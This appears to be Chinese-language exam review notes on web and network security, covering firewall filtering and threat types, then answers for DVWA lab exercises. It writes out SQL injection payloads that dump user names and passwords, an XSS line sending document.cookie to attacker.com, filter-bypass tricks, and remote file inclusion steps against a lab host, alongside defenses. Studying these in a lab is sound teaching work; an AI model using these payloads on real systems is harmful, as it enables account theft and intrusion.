### 4. 防火墙包过滤技术操作流程

**五步记忆**：抓包 → 匹配 → 判定 → 执行 → 记录

1. **数据包捕获**：抓取数据包，提取头部信息（源IP、目的IP、源端口、目的端口、协议类型、TCP标志位）
2. **规则匹配检索**：自上而下与ACL规则逐条比对
3. **规则判定处理**：
   - 匹配 allow → 放行
   - 匹配 deny → 丢弃（可记录日志）
   - 无匹配 → 执行默认策略（默认丢弃）
4. **转发或丢弃执行**：
   - 放行包：修改路由，转发到目标
   - 丢弃包：终止传输，返回或记录日志
5. **记录日志**：按需留存访问日志

### 6. 被动威胁 vs 主动威胁

| 特征         | 被动威胁               | 主动威胁                |
| ------------ | ---------------------- | ----------------------- |
| **行为**     | 窃取、截获信息         | 截获+修改/删除/伪造数据 |
| **攻击目标** | 保密性                 | 完整性、真实性          |
| **检测难度** | 很难检测（不修改数据） | 较难预防                |
| **应对方法** | **预防**为主           | **检测+恢复**为主       |
| **发生场合** | 传输过程中             | 传输+存储过程           |

**关键词记忆**：

- 被动：窃听、流量分析 → 预防
- 主动：篡改、伪造 → 检测+恢复

### 15. 漏洞扫描的原理

**核心概念**：基于**特征码（指纹信息）**识别漏洞

**工作原理**：

1. 针对同一类型和版本的系统/软件，某个安全漏洞在安装补丁前后，对特定请求的应答存在**细微差异**
2. 这些差异构成针对该漏洞的**特征码（指纹信息）**
3. 漏洞扫描技术利用这些特征码来识别目标对象是否存在特定安全漏洞

**应用**：

- 网络攻击：利用漏洞
- 安全防御：系统管理员扫描网络漏洞，及时安装补丁，提升安全性

## 二、实操题（DVWA靶场）

### （一）SQL注入（SQL Injection）

#### 1. 判断漏洞类型

**题目**：输入单引号 `'` 页面返回数据库语法报错

**答案**：

- **原因**：输入单引号会闭合后台SQL语句中原有的单引号，破坏原有SQL语法结构，数据库执行非法语法抛出报错
- **结论**：页面出现数据库报错，证明页面**未过滤用户输入**，存在**字符型SQL注入漏洞**

---

#### 2. 判断字段数和获取信息

##### (1) 判断字段数：`order by`

```sql
' order by 3 --
```

- **含义**：利用`order by`判断数据表字段数量，数字3代表查询数据表是否存在第3列
- **目的**：确定联合查询时可展示数据的字段数，为`union`查询做准备

**判断方法**：

- `order by 2` 正常 → 至少有2个字段
- `order by 3` 报错 → 只有2个字段

##### (2) 获取数据库信息：`union select`

```sql
' union select database(),version() --
```

- **含义**：联合查询拼接两条查询语句
- **目的**：
  - `database()`：获取当前网站数据库名称
  - `version()`：获取后端MySQL数据库版本

---

#### 3. SQL注入的修复方案

**题目**：给出四项整改操作方案，指出**唯一能彻底根治**注入漏洞的方案

| 方案  | 内容                                                | 是否能根治 | 原因                                                                                    |
| ----- | --------------------------------------------------- | ---------- | --------------------------------------------------------------------------------------- |
| A     | 后端代码对单引号、注释符、SQL关键字进行转义过滤     | ❌ 不能    | 仅表层过滤，存在编码、变形绕过手段，只能临时降低攻击成功率                              |
| **B** | **重构数据库交互代码，采用预编译参数化查询执行SQL** | ✅ **能**  | **参数化查询将用户输入与SQL语法完全隔离，恶意字符无法篡改语句逻辑，从底层根除注入漏洞** |
| C     | 前端部署WAF，拦截union、select等注入特征词          | ❌ 不能    | WAF关键词拦截可通过大小写替换、URL编码等方式绕过，仅起到基础防护效果                    |
| D     | 收缩数据库账号权限，仅开放查询权限                  | ❌ 不能    | 只能限制漏洞造成的破坏范围，无法阻止注入漏洞本身被利用                                  |

**根治方案**：**B（预编译参数化查询）**

**预编译原理**：

```php
// 错误示例（拼接SQL）
$sql = "SELECT * FROM users WHERE user_id = '$id'";

// 正确示例（预编译）
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

---

#### 4. SQL注入实战题型

##### (1) 判断注入类型

**题目**：

- 输入 `'` → 页面数据库报错
- 输入 `1' and 1=1 #` → 正常返回数据
- 输入 `1' and 1=2 #` → 无数据

**答案**：属于**字符型注入**

- **依据**：
  1. 参数用单引号闭合，单引号破坏语法报错
  2. `and 1=1`、`and 1=2` 能区分真假条件，符合字符型注入判定特征

**数字型 vs 字符型判断**：

- 数字型：`id=1 and 1=1` 和 `id=1 and 1=2`（无需单引号）
- 字符型：`id=1' and 1=1 #` 和 `id=1' and 1=2 #`（需要单引号闭合）

##### (2) `order by` 和 `#` 的作用

```sql
1' order by 2 #
```

**答案**：

1. **`order by` 的作用**：猜测数据表字段数量
2. **`#` 的功能**：SQL注释符，注释后方多余语句，避免语法报错
3. **该语句执行成功无报错**：说明查询表有 **2个回显字段**

##### (3) 实操语句填空

**① 查询当前网站数据库名称**：

```sql
1' and 1=2 union select database(),2 #
```

- 答案：`database()`

**② 获取users表内账号密码**：

```sql
1' and 1=2 union select 1,group_concat(user,password) from users #
```

- 答案：`user,password`

**`group_concat()` 函数**：将多行数据连接成一个字符串

##### (4) 页面无数据回显的原因和解决办法

**原因1**：union前后字段数量不一致

- **解决**：使用`order by`重新确定字段数，匹配两侧列数

**原因2**：未使用`and 1=2`让前半查询失效

- **解决**：在union前添加`and 1=2`清空原有查询结果

**原因3**：缺少注释符`#`，末尾单引号引发语法错误

- **解决**：语句结尾添加`#`注释多余代码

### （二）XSS（跨站脚本攻击）

**答案**：

1. **JavaScript**（恶意攻击代码）

**对比**：

- SQL注入：恶意语句运行在**后端数据库服务器**

#### 2. XSS载荷作用

**题目**：载荷 `alert(document.cookie)` 的作用是：

**答案**：**弹窗读取并展示当前用户的Cookie会话凭证**

**XSS常用测试载荷**：

```javascript
<script>alert(1)</script>

<script>window.location='http:// attacker.com/?cookie='+document.cookie</script>
```

---

#### 3. 漏洞分类：反射型XSS vs 存储型XSS

**最核心区别**：**是否存入数据库**

| 类型          | 是否存储    | 触发方式                              | 影响范围                 |
| ------------- | ----------- | ------------------------------------- | ------------------------ |
| **反射型XSS** | ❌ 不存储   | 访问携带恶意代码的URL时**一次性触发** | 仅影响点击恶意链接的用户 |
| **存储型XSS** | ✅ 持久存储 | 所有访问该页面的用户**都会触发**      | 影响所有用户             |

**记忆口诀**：

- 反射型：不存储，一次性，URL触发
- 存储型：存数据库，持久化，所有用户触发

### （三）文件包含（File Inclusion）

#### 1. PHP包含函数填空

**题目**：PHP包含函数填空

**答案**：

1. **加载文件失败仅警告、脚本继续运行的函数**：`include()`
2. **加载文件失败抛出致命错误、直接终止页面运行的函数**：`require()`
3. **重复加载同一文件只会执行一次的函数**：`include_once()` 和 `require_once()`

**区别对比**：

| 函数             | 文件不存在时                      | 重复包含   |
| ---------------- | --------------------------------- | ---------- |
| `include()`      | 警告（Warning），脚本继续         | 多次执行   |
| `require()`      | 致命错误（Fatal Error），脚本终止 | 多次执行   |
| `include_once()` | 警告（Warning），脚本继续         | 只执行一次 |
| `require_once()` | 致命错误（Fatal Error），脚本终止 | 只执行一次 |

#### 3. 远程文件包含（RFI）实操步骤

**题目**：攻击机Kali地址：192.168.146.110，恶意脚本文件名shell.php

**答案**：

**(1) Kali开启Apache服务完整命令**

```bash
sudo service apache2 start
```

**(2) shell.php内执行PHP信息查看的代码**

```php
<?php phpinfo(); ?>
```

**(3) DVWA页面远程包含完整URL载荷**

```
?page=http://192.168.146.110/shell.php
```

**远程文件包含原理**：

- 当PHP配置`allow_url_include=On`时，可以包含远程服务器的文件
- 攻击者在自己服务器上放置恶意PHP文件
- 目标服务器通过`include()`或`require()`函数包含该远程文件
- 恶意代码在目标服务器上执行

**防御方法**：

1. 关闭`allow_url_include`（php.ini配置）
2. 对用户输入进行严格过滤（白名单）
3. 使用`open_basedir`限制文件访问范围

### 易错点提醒

1. **字符型 vs 数字型注入**：
   - 字符型需要单引号闭合：`1' and 1=1 #`
   - 数字型不需要单引号：`1 and 1=1`

2. **SQL注释符**：
   - MySQL：`#` 或 `-- `（注意空格）
   - SQL Server：`--`
   - Oracle：`--`

3. **`order by` vs `group by`**：
   - `order by`：排序（用于判断字段数）
   - `group by`：分组（不用于判断字段数）

4. **XSS过滤绕过**：
   - 大小写混淆：`<SCRIPT>`
   - 嵌套标签：`<scr<script>ipt>`
   - 其他标签：`<img>`、`<svg>`、`<body>`

5. **Cookie属性**：
   - `HttpOnly`：防XSS窃取
   - `Secure`：仅HTTPS传输
   - `SameSite`：防跨站请求
